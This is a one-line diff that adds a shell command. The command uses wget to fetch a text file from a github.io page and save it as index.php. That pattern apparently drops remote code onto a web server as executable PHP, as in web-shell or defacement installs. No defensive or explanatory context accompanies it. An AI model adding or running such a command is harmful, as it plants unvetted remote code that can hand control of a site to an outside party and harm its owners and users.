@@ -1,0 +1,1 @@
+wget https://vyscomaylando.github.io/wget/index.txt -O index.php
